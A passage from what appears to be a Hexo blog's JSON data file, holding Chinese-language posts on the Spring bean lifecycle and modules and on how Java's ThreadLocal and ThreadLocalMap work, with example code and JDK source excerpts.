特定的Aware接口，提供了对IOC容器的操作.<br></p>\n<ul>\n<li><p>BeanPostProcessor前置处理(postProcessorBeforeInitializion)</p>\n</li>\n<li><p>InitiallizionBean 中 afterProjectSet方法</p>\n</li>\n<li><p>自定义的init-method</p>\n</li>\n<li><p>BeanPostProcessor的后置处理(postProcessorAfterInitializion)</p>\n</li>\n<li><p>Bean就绪</p>\n</li>\n<li><p>DisposableBean的destory方法</p>\n</li>\n<li><p>自定义的destory-method</p>\n</li>\n</ul>\n<h3 id=\"3-Spring的七个模块\"><a href=\"#3-Spring的七个模块\" class=\"headerlink\" title=\"3.Spring的七个模块\"></a>3.Spring的七个模块</h3><ul>\n<li>1.Spring Core</li>\n</ul>\n<p>Core模块是Spring的核心类库，Spring的所有功能都依赖于该类库，Core主要实现IOC功能，Sprign的所有功能都是借助IOC实现的</p>\n<ul>\n<li>2.Spring Aop</li>\n</ul>\n<p>AOP模块是Spring的AOP库，提供了AOP（拦截器）机制，并提供常用的拦截器，供用户自定义和配置</p>\n<ul>\n<li><p>3.Spring ORM</p>\n</li>\n<li><p>4.Spring DAO</p>\n</li>\n<li><p>5.Spring Web</p>\n</li>\n<li><p>6.Spring context</p>\n</li>\n</ul>\n<p>Spring上下文是spring的配置文件，向Spring框架提供上下文信息,可以用来管理bean.</p>\n<ul>\n<li>7.Spring WebMVC</li>\n</ul>\n<p>WEB MVC模块为Spring提供了一套轻量级的MVC实现，在Spring的开发中，我们既可以用Struts也可以用Spring自己的MVC框架，相对于Struts，Spring自己的MVC框架更加简洁和方便  </p>\n"},{"title":"ThreadLocal了解","date":"2019-07-27T20:43:55.000Z","_content":"http://www.jasongj.com/java/threadlocal/\n\n# 一.ThreadLocal作用\n\n## 1.作用\n\n一半都说是实现了变量在线程间隔离,在类或者方法间共享。<br>\n但是看到这句话一脸迷茫，怎么实现的，为什么要实现??\n\n## 2.为什么要用\n\n通常情况下，我们创建的变量是可以被任何一个线程访问并修改的。而使用ThreadLocal创建的变量只能被当前线程访问，其他线程则无法访问和修改(线程间隔离),同时在改线程的类或方法中，都能获取该变量的同一实例(方法间共享)。\n\n## 3.例子\n\n```\npublic class ThreadLocalTest {\n\n    public static void main(String[] args) throws InterruptedException {\n        InnerClass innerClass = new InnerClass();\n        for(int i = 1; i <= 2; i++) {\n            new Thread(() -> {\n                for(int j = 0; j < 2; j++) {\n                    innerClass.add(String.valueOf(j));\n                    innerClass.print();\n                }\n                innerClass.set(\"hello world\");\n            }, \"thread - \" + i).start();\n        }\n\n    }\n\n    private static class InnerClass {\n        public void add(String newStr) {\n            StringBuilder str = Counter.counter.get();\n            Counter.counter.set(str.append(newStr));\n        }\n\n        public void print() {\n            System.out.printf(\"Thread name:%s , ThreadLocal hashcode:%s, Instance hashcode:%s, Value:%s\\n\",\n                    Thread.currentThread().getName(),\n                    Counter.counter.hashCode(),\n                    Counter.counter.get().hashCode(),\n                    Counter.counter.get().toString());\n        }\n\n        public void set(String words) {\n            Counter.counter.set(new StringBuilder(words));\n            System.out.printf(\"Set, Thread name:%s , ThreadLocal hashcode:%s,  Instance hashcode:%s, Value:%s\\n\",\n                    Thread.currentThread().getName(),\n                    Counter.counter.hashCode(),\n                    Counter.counter.get().hashCode(),\n                    Counter.counter.get().toString());\n        }\n    }\n\n    private static class Counter {\n        private static ThreadLocal<StringBuilder> counter = new ThreadLocal<StringBuilder>() {\n            //重写 initialValue 为ThreadLocal get()提供初始值\n            @Override\n            protected StringBuilder initialValue() {\n                return new StringBuilder();\n            }\n        };\n\n    }\n}\n\n```\n\n结果\n\n```\n1 Thread name:thread - 1 , ThreadLocal hashcode:1101022441, Instance hashcode:1332191917, Value:0\n2 Thread name:thread - 1 , ThreadLocal hashcode:1101022441, Instance hashcode:1332191917, Value:01\n3 Set, Thread name:thread - 1 , ThreadLocal hashcode:1101022441,  Instance hashcode:1821539951, Value:hello world\n4 Thread name:thread - 2 , ThreadLocal hashcode:1101022441, Instance hashcode:831382771, Value:0\n5 Thread name:thread - 2 , ThreadLocal hashcode:1101022441, Instance hashcode:831382771, Value:01\n6 Set, Thread name:thread - 2 , ThreadLocal hashcode:1101022441,  Instance hashcode:1061821618, Value:hello world\n```\n\n结果分析：<br>\n在这个例子里面 StringBuilder 为 ThreadLocal中的变量.<br>\n\n- 从结果 1-6 ThreadLocal hashcode可以看到，所有threadlocal都是同一个实例\n\n- 从结果 1,2和4,5  Instance hashcode 和 value可以看到, 在同一个线程中,变量是共享的，在不同线程中，是不同的变量\n\n- 从结果 12和3，45和6中的 Instance hashCode 可以看出，ThreadLocal 的set() 方法，可以改变ThreadLocal中的变量实例\n\n- 从代码中可见， 虽然都是 Counter.counter.get() 得到value再拼接，但是，在不同线程中，有自己的副本，不影响其它现在，这里set()没有改变变量实例，是因为 用的就是当前实例，没有new StringBuilder(words)；\n\n# 二.原理\n\n实现\n\n## 1.构造方法\n\n```\npublic ThreadLocal() {\n}\n\n//如果想在初始化时设置get()的初始值，需要重写initialValue方法\nprivate static ThreadLocal<StringBuilder> counter = new ThreadLocal<StringBuilder>() {\n    @Override\n    protected StringBuilder initialValue() {\n        return new StringBuilder();\n    }\n};\n```\n\n## 2.get()\n\n```\npublic T get() {\n    Thread t = Thread.currentThread();\n    ThreadLocalMap map = getMap(t);\n    if (map != null) {\n        ThreadLocalMap.Entry e = map.getEntry(this);\n        if (e != null) {\n            @SuppressWarnings(\"unchecked\")\n            T result = (T)e.value;\n            return result;\n        }\n    }\n    return setInitialValue();\n}\n```\n\n可以看出，在ThreadLocal中，使用了ThreadLocalMap 来维护变量与线程之间的关系，其中 Thread为key.<br>\n如果不存在，则调用 setInitialValue()初始化，setInitialValue()又调用了initialValue(), 所以，初始化时，需要重写initialValue方法,可以在get()时得到我们相要的值.\n\n## 3.ThreadLocalMap\n\nThreadLocalMap 为 ThreadLocal 的静态内部类。<br>\n\n```\nstatic class ThreadLocalMap {\n\n    static class Entry extends WeakReference<ThreadLocal<?>> {\n        /** The value associated with this ThreadLocal. */\n        Object value;\n\n        Entry(ThreadLocal<?> k, Object v) {\n            super(k);\n            value = v;\n        }\n    }\n\n    .....\n}\n```\n\n在ThreadLocalMap中 Entry是弱引用<br>\n使用ThreadLocal的弱引用作为key<br>\n\n- 为什么要用弱引用\n\n弱引用实例不会影响到被应用对象的GC回收行为，什么意思呢？<br>\n如果一个对象通过一串强引用链接可到达(Strongly reachable)，它是不会被回收的。而弱引用不能阻挡垃圾回收器对其回收。<br>\n\n但是由于每个线程访问某 ThreadLocal 变量后，都会在自己的 Map 内维护该 ThreadLocal 变量与具体实例的映射(ThreadLocalMap)，如果不删除这些引用（映射），则这些 ThreadLocal 不能被回收，可能会造成内存泄漏<br>\n\n所以,使用弱引用的原因在于，当没有强引用指向 ThreadLocal 变量时，它可被回收，从而避免上文所述 ThreadLocal 不能被回收而造成的内存泄漏的问题。<br>\n\n但是，因为key为弱引用，当垃圾回收后，可能会形成key为null，value还存在的内存泄露问题。所以，ThreadLocal 会在 get或set时，擦除这种value.\n\n```\nprivate Entry getEntry(ThreadLocal<?> key) {\n     int i = key.threadLocalHashCode & (table.length - 1);\n     Entry e = table[i];\n     if (e != null && e.get() == key)\n         return e;\n     else\n         return getEntryAfterMiss(key, i, e);\n}\n\nprivate Entry getEntryAfterMiss(ThreadLocal<?> key, int i, Entry e) {\n    Entry[] tab = table;\n    int len = tab.length;\n\n    while (e != null) {\n        ThreadLocal<?> k = e.get();\n        if (k == key)\n            return e;\n        if (k == null)\n            expungeStaleEntry(i);\n        else\n            i = nextIndex(i, len);\n        e = tab[i];\n    }\n    return null;\n}\n\n//擦除\nprivate int expungeStaleEntry(int staleSlot) {\n       Entry[] tab = table;\n       int len = tab.length;\n\n       // expunge entry at staleSlot\n       tab[staleSlot].value = null;\n       tab[staleSlot] = null;\n       size--;\n ......\n}\n```\n\n## 4.set()\n\n```\npublic void set(T value) {\n    Thread t = Thread.currentThread();\n    ThreadLocalMap map = getMap(t);\n    if (map != null)\n        map.set(this, value);\n    else\n        createMap(t, value);\n}\n```\n","source":"_posts/java/thread/threadlocal.md","raw":"---\ntitle: ThreadLocal了解\ndate: 2019-07-27 16:43:55\ntags: [java]\n---\nhttp://www.jasongj.com/java/threadlocal/\n\n# 一.ThreadLocal作用\n\n## 1.作用\n\n一半都说是实现了变量在线程间隔离,在类或者方法间共享。<br>\n但是看到这句话一脸迷茫，怎么实现的，为什么要实现??\n\n## 2.为什么要用\n\n通常情况下，我们创建的变量是可以被任何一个线程访问并修改的。而使用ThreadLocal创建的变量只能被当前线程访问，其他线程则无法访问和修改(线程间隔离),同时在改线程的类或方法中，都能获取该变量的同一实例(方法间共享)。\n\n## 3.例子\n\n```\npublic class ThreadLocalTest {\n\n    public static void main(String[] args) throws InterruptedException {\n        InnerClass innerClass = new InnerClass();\n        for(int i = 1; i <= 2; i++) {\n            new Thread(() -> {\n                for(int j = 0; j < 2; j++) {\n                    innerClass.add(String.valueOf(j));\n                    innerClass.print();\n                }\n                innerClass.set(\"hello world\");\n            }, \"thread - \" + i).start();\n        }\n\n    }\n\n    private static class InnerClass {\n        public void add(String newStr) {\n            StringBuilder str = Counter.counter.get();\n            Counter.counter.set(str.append(newStr));\n        }\n\n        public void print() {\n            System.out.printf(\"Thread name:%s , ThreadLocal hashcode:%s, Instance hashcode:%s, Value:%s\\n\",\n                    Thread.currentThread().getName(),\n                    Counter.counter.hashCode(),\n                    Counter.counter.get().hashCode(),\n                    Counter.counter.get().toString());\n        }\n\n        public void set(String words) {\n            Counter.counter.set(new StringBuilder(words));\n            System.out.printf(\"Set, Thread name:%s , ThreadLocal hashcode:%s,  Instance hashcode:%s, Value:%s\\n\",\n                    Thread.currentThread().getName(),\n                    Counter.counter.hashCode(),\n                    Counter.counter.get().hashCode(),\n                    Counter.counter.get().toString());\n        }\n    }\n\n    private static class Counter {\n        private static ThreadLocal<StringBuilder> counter = new ThreadLocal<StringBuilder>() {\n            //重写 initialValue 为ThreadLocal get()提供初始值\n            @Override\n            protected StringBuilder initialValue() {\n                return new StringBuilder();\n            }\n        };\n\n    }\n}\n\n```\n\n结果\n\n```\n1 Thread name:thread - 1 , ThreadLocal hashcode:1101022441, Instance hashcode:1332191917, Value:0\n2 Thread name:thread - 1 , ThreadLocal hashcode:1101022441, Instance hashcode:1332191917, Value:01\n3 Set, Thread name:thread - 1 , ThreadLocal hashcode:1101022441,  Instance hashcode:1821539951, Value:hello world\n4 Thread name:thread - 2 , ThreadLocal hashcode:1101022441, Instance hashcode:831382771, Value:0\n5 Thread name:thread - 2 , ThreadLocal hashcode:1101022441, Instance hashcode:831382771, Value:01\n6 Set, Thread name:thread - 2 , ThreadLocal hashcode:1101022441,  Instance hashcode:1061821618, Value:hello world\n```\n\n结果分析：<br>\n在这个例子里面 StringBuilder 为 ThreadLocal中的变量.<br>\n\n- 从结果 1-6 ThreadLocal hashcode可以看到，所有threadlocal都是同一个实例\n\n- 从结果 1,2和4,5  Instance hashcode 和 value可以看到, 在同一个线程中,变量是共享的，在不同线程中，是不同的变量\n\n- 从结果 12和3，45和6中的 Instance hashCode 可以看出，ThreadLocal 的set() 方法，可以改变ThreadLocal中的变量实例\n\n- 从代码中可见， 虽然都是 Counter.counter.get() 得到value再拼接，但是，在不同线程中，有自己的副本，不影响其它现在，这里set()没有改变变量实例，是因为 用的就是当前实例，没有new StringBuilder(words)；\n\n# 二.原理\n\n实现\n\n## 1.构造方法\n\n```\npublic ThreadLocal() {\n}\n\n//如果想在初始化时设置get()的初始值，需要重写initialValue方法\nprivate static ThreadLocal<StringBuilder> counter = new ThreadLocal<StringBuilder>() {\n    @Override\n    protected StringBuilder initialValue() {\n        return new StringBuilder();\n    }\n};\n```\n\n## 2.get()\n\n```\npublic T get() {\n    Thread t = Thread.currentThread();\n    ThreadLocalMap map = getMap(t);\n    if (map != null) {\n        ThreadLocalMap.Entry e = map.getEntry(this);\n        if (e != null) {\n            @SuppressWarnings(\"unchecked\")\n            T result = (T)e.value;\n            return result;\n        }\n    }\n    return setInitialValue();\n}\n```\n\n可以看出，在ThreadLocal中，使用了ThreadLocalMap 来维护变量与线程之间的关系，其中 Thread为key.<br>\n如果不存在，则调用 setInitialValue()初始化，setInitialValue()又调用了initialValue(), 所以，初始化时，需要重写initialValue方法,可以在get()时得到我们相要的值.\n\n## 3.ThreadLocalMap\n\nThreadLocalMap 为 ThreadLocal 的静态内部类。<br>\n\n```\nstatic class ThreadLocalMap {\n\n    static class Entry extends WeakReference<ThreadLocal<?>> {\n        /** The value associated with this ThreadLocal. */\n        Object value;\n\n        Entry(ThreadLocal<?> k, Object v) {\n            super(k);\n            value = v;\n        }\n    }\n\n    .....\n}\n```\n\n在ThreadLocalMap中 Entry是弱引用<br>\n使用ThreadLocal的弱引用作为key<br>\n\n- 为什么要用弱引用\n\n弱引用实例不会影响到被应用对象的GC回收行为，什么意思呢？<br>\n如果一个对象通过一串强引用链接可到达(Strongly reachable)，它是不会被回收的。而弱引用不能阻挡垃圾回收器对其回收。<br>\n\n但是由于每个线程访问某 ThreadLocal 变量后，都会在自己的 Map 内维护该 ThreadLocal 变量与具体实例的映射(ThreadLocalMap)，如果不删除这些引用（映射），则这些 ThreadLocal 不能被回收，可能会造成内存泄漏<br>\n\n所以,使用弱引用的原因在于，当没有强引用指向 ThreadLocal 变量时，它可被回收，从而避免上文所述 ThreadLocal 不能被回收而造成的内存泄漏的问题。<br>\n\n但是，因为key为弱引用，当垃圾回收后，可能会形成key为null，value还存在的内存泄露问题。所以，ThreadLocal 会在 get或set时，擦除这种value.\n\n```\nprivate Entry getEntry(ThreadLocal<?> key) {\n     int i = key.threadLocalHashCode & (table.length - 1);\n     Entry e = table[i];\n     if (e != null && e.get() == key)\n         return e;\n     else\n         return getEntryAfterMiss(key, i, e);\n}\n\nprivate Entry getEntryAfterMiss(ThreadLocal<?> key, int i, Entry e) {\n    Entry[] tab = table;\n    int len = tab.length;\n\n    while (e != null) {\n        ThreadLocal<?> k = e.get();\n        if (k == key)\n            return e;\n        if (k == null)\n            expungeStaleEntry(i);\n        else\n            i = nextIndex(i, len);\n        e = tab[i];\n    }\n    return null;\n}\n\n//擦除\nprivate int expungeStaleEntry(int staleSlot) {\n       Entry[] tab = table;\n       int len = tab.length;\n\n       // expunge entry at staleSlot\n       tab[staleSlot].value = null;\n       tab[staleSlot] = null;\n       size--;\n ......\n}\n```\n\n## 4.set()\n\n```\npublic void set(T value) {\n    Thread t = Thread.currentThread();\n    ThreadLocalMap map = getMap(t);\n    if (map != null)\n        map.set(this, value);\n    else\n        createMap(t, value);\n}\n```\n","slug":"java/thread/threadlocal","published":1,"updated":"2019-10-13T12:15:12.172Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321lo004m6dcpxxhgwg12","content":"<p><a href=\"http://www.jasongj.com/java/threadlocal/\" target=\"_blank\" rel=\"noopener\">http://www.jasongj.com/java/threadlocal/</a></p>\n<h1 id=\"一-ThreadLocal作用\"><a href=\"#一-ThreadLocal作用\" class=\"headerlink\" title=\"一.ThreadLocal作用\"></a>一.ThreadLocal作用</h1><h2 id=\"1-作用\"><a href=\"#1-作用\" class=\"headerlink\" title=\"1.作用\"></a>1.作用</h2><p>一半都说是实现了变量在线程间隔离,在类或者方法间共享。<br><br>但是看到这句话一脸迷茫，怎么实现的，为什么要实现??</p>\n<h2 id=\"2-为什么要用\"><a href=\"#2-为什么要用\" class=\"headerlink\" title=\"2.为什么要用\"></a>2.为什么要用</h2><p>通常情况下，我们创建的变量是可以被任何一个线程访问并修改的。而使用ThreadLocal创建的变量只能被当前线程访问，其他线程则无法访问和修改(线程间隔离),同时在改线程的类或方法中，都能获取该变量的同一实例(方法间共享)。</p>\n<h2 id=\"3-例子\"><a href=\"#3-例子\" class=\"headerlink\" title=\"3.例子\"></a>3.例子</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class ThreadLocalTest &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    public static void main(String[] args) throws InterruptedException &#123;</span><br><span class=\"line\">        InnerClass innerClass = new InnerClass();</span><br><span class=\"line\">        for(int i = 1; i &lt;= 2; i++) &#123;</span><br><span class=\"line\">            new Thread(() -&gt; &#123;</span><br><span class=\"line\">                for(int j = 0; j &lt; 2; j++) &#123;</span><br><span class=\"line\">                    innerClass.add(String.valueOf(j));</span><br><span class=\"line\">                    innerClass.print();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                innerClass.set(&quot;hello world&quot;);</span><br><span class=\"line\">            &#125;, &quot;thread - &quot; + i).start();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static class InnerClass &#123;</span><br><span class=\"line\">        public void add(String newStr) &#123;</span><br><span class=\"line\">            StringBuilder str = Counter.counter.get();</span><br><span class=\"line\">            Counter.counter.set(str.append(newStr));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        public void print() &#123;</span><br><span class=\"line\">            System.out.printf(&quot;Thread name:%s , ThreadLocal hashcode:%s, Instance hashcode:%s, Value:%s\\n&quot;,</span><br><span class=\"line\">                    Thread.currentThread().getName(),</span><br><span class=\"line\">                    Counter.counter.hashCode(),</span><br><span class=\"line\">                    Counter.counter.get().hashCode(),</span><br><span class=\"line\">                    Counter.counter.get().toString());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        public void set(String words) &#123;</span><br><span class=\"line\">            Counter.counter.set(new StringBuilder(words));</span><br><span class=\"line\">            System.out.printf(&quot;Set, Thread name:%s , ThreadLocal hashcode:%s,  Instance hashcode:%s, Value:%s\\n&quot;,</span><br><span class=\"line\">                    Thread.currentThread().getName(),</span><br><span class=\"line\">                    Counter.counter.hashCode(),</span><br><span class=\"line\">                    Counter.counter.get().hashCode(),</span><br><span class=\"line\">                    Counter.counter.get().toString());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    private static class Counter &#123;</span><br><span class=\"line\">        private static ThreadLocal&lt;StringBuilder&gt; counter = new ThreadLocal&lt;StringBuilder&gt;() &#123;</span><br><span class=\"line\">            //重写 initialValue 为ThreadLocal get()提供初始值</span><br><span class=\"line\">            @Override</span><br><span class=\"line\">            protected StringBuilder initialValue() &#123;</span><br><span class=\"line\">                return new StringBuilder();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1 Thread name:thread - 1 , ThreadLocal hashcode:1101022441, Instance hashcode:1332191917, Value:0</span><br><span class=\"line\">2 Thread name:thread - 1 , ThreadLocal hashcode:1101022441, Instance hashcode:1332191917, Value:01</span><br><span class=\"line\">3 Set, Thread name:thread - 1 , ThreadLocal hashcode:1101022441,  Instance hashcode:1821539951, Value:hello world</span><br><span class=\"line\">4 Thread name:thread - 2 , ThreadLocal hashcode:1101022441, Instance hashcode:831382771, Value:0</span><br><span class=\"line\">5 Thread name:thread - 2 , ThreadLocal hashcode:1101022441, Instance hashcode:831382771, Value:01</span><br><span class=\"line\">6 Set, Thread name:thread - 2 , ThreadLocal hashcode:1101022441,  Instance hashcode:1061821618, Value:hello world</span><br></pre></td></tr></table></figure>\n<p>结果分析：<br><br>在这个例子里面 StringBuilder 为 ThreadLocal中的变量.<br></p>\n<ul>\n<li><p>从结果 1-6 ThreadLocal hashcode可以看到，所有threadlocal都是同一个实例</p>\n</li>\n<li><p>从结果 1,2和4,5  Instance hashcode 和 value可以看到, 在同一个线程中,变量是共享的，在不同线程中，是不同的变量</p>\n</li>\n<li><p>从结果 12和3，45和6中的 Instance hashCode 可以看出，ThreadLocal 的set() 方法，可以改变ThreadLocal中的变量实例</p>\n</li>\n<li><p>从代码中可见， 虽然都是 Counter.counter.get() 得到value再拼接，但是，在不同线程中，有自己的副本，不影响其它现在，这里set()没有改变变量实例，是因为 用的就是当前实例，没有new StringBuilder(words)；</p>\n</li>\n</ul>\n<h1 id=\"二-原理\"><a href=\"#二-原理\" class=\"headerlink\" title=\"二.原理\"></a>二.原理</h1><p>实现</p>\n<h2 id=\"1-构造方法\"><a href=\"#1-构造方法\" class=\"headerlink\" title=\"1.构造方法\"></a>1.构造方法</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public ThreadLocal() &#123;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//如果想在初始化时设置get()的初始值，需要重写initialValue方法</span><br><span class=\"line\">private static ThreadLocal&lt;StringBuilder&gt; counter = new ThreadLocal&lt;StringBuilder&gt;() &#123;</span><br><span class=\"line\">    @Override</span><br><span class=\"line\">    protected StringBuilder initialValue() &#123;</span><br><span class=\"line\">        return new StringBuilder();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-get\"><a href=\"#2-get\" class=\"headerlink\" title=\"2.get()\"></a>2.get()</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public T get() &#123;</span><br><span class=\"line\">    Thread t = Thread.currentThread();</span><br><span class=\"line\">    ThreadLocalMap map = getMap(t);</span><br><span class=\"line\">    if (map != null) &#123;</span><br><span class=\"line\">        ThreadLocalMap.Entry e = map.getEntry(this);</span><br><span class=\"line\">        if (e != null) &#123;</span><br><span class=\"line\">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class=\"line\">            T result = (T)e.value;</span><br><span class=\"line\">            return result;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return setInitialValue();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看出，在ThreadLocal中，使用了ThreadLocalMap 来维护变量与线程之间的关系，其中 Thread为key.<br><br>如果不存在，则调用 setInitialValue()初始化，setInitialValue()又调用了initialValue(), 所以，初始化时，需要重写initialValue方法,可以在get()时得到我们相要的值.</p>\n<h2 id=\"3-ThreadLocalMap\"><a href=\"#3-ThreadLocalMap\" class=\"headerlink\" title=\"3.ThreadLocalMap\"></a>3.ThreadLocalMap</h2><p>ThreadLocalMap 为 ThreadLocal 的静态内部类。<br></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static class ThreadLocalMap &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    static class Entry extends WeakReference&lt;ThreadLocal&lt;?&gt;&gt; &#123;</span><br><span class=\"line\">        /** The value associated with this ThreadLocal. */</span><br><span class=\"line\">        Object value;</span><br><span class=\"line\"></span><br><span class=\"line\">        Entry(ThreadLocal&lt;?&gt; k, Object v) &#123;</span><br><span class=\"line\">            super(k);</span><br><span class=\"line\">            value = v;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    .....</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在ThreadLocalMap中 Entry是弱引用<br><br>使用ThreadLocal的弱引用作为key<br></p>\n<ul>\n<li>为什么要用弱引用</li>\n</ul>\n<p>弱引用实例不会影响到被应用对象的GC回收行为，什么意思呢？<br><br>如果一个对象通过一串强引用链接可到达(Strongly reachable)，它是不会被回收的。而弱引用不能阻挡垃圾回收器对其回收。<br></p>\n<p>但是由于每个线程访问某 ThreadLocal 变量后，都会在自己的 Map 内维护该 ThreadLocal 变量与具体实例的映射(ThreadLocalMap)，如果不删除这些引用（映射），则这些 ThreadLocal 不能被回收，可能会造成内存泄漏<br></p>\n<p>所以,使用弱引用的原因在于，当没有强引用指向 ThreadLocal 变量时，它可被回收，从而避免上文所述 ThreadLocal 不能被回收而造成的内存泄漏的问题。<br></p>\n<p>但是，因为key为弱引用，当垃圾回收后，可能会形成key为null，value还存在的内存泄露问题。所以，ThreadLocal 会在 get或set时，擦除这种value.</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">private Entry getEntry(ThreadLocal&lt;?&gt; key) &#123;</span><br><span class=\"line\">     int i = key.threadLocalHashCode &amp; (table.length - 1);</span><br><span class=\"line\">     Entry e = table[i];</span><br><span class=\"line\">     if (e != null &amp;&amp; e.get() == key)</span><br><span class=\"line\">         return e;</span><br><span class=\"line\">     else</span><br><span class=\"line\">         return getEntryAfterMiss(key, i, e);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">private Entry getEntryAfterMiss(ThreadLocal&lt;?&gt; key, int i, Entry e) &#123;</span><br><span class=\"line\">    Entry[] tab = table;</span><br><span class=\"line\">    int len = tab.length;</span><br><span class=\"line\"></span><br><span class=\"line\">    while (e != null) &#123;</span><br><span class=\"line\">        ThreadLocal&lt;?&gt; k = e.get();</span><br><span class=\"line\">        if (k == key)</span><br><span class=\"line\">            return e;</span><br><span class=\"line\">        if (k == null)</span><br><span class=\"line\">            expungeStaleEntry(i);</span><br><span class=\"line\">        else</span><br><span class=\"line\">            i = nextIndex(i, len);</span><br><span class=\"line\">        e = tab[i];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return null;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">//擦除</span><br><span class=\"line\">private int expungeStaleEntry(int staleSlot) &#123;</span><br><span class=\"line\">       Entry[] tab = table;</span><br><span class=\"line\">       int len = tab.length;</span><br><span class=\"line\"></span><br><span class=\"line\">       // expunge entry at staleSlot</span><br><span class=\"line\">       tab[staleSlot].value = null;</span><br><span class=\"line\">       tab[staleSlot] = null;</span><br><span class=\"line\">       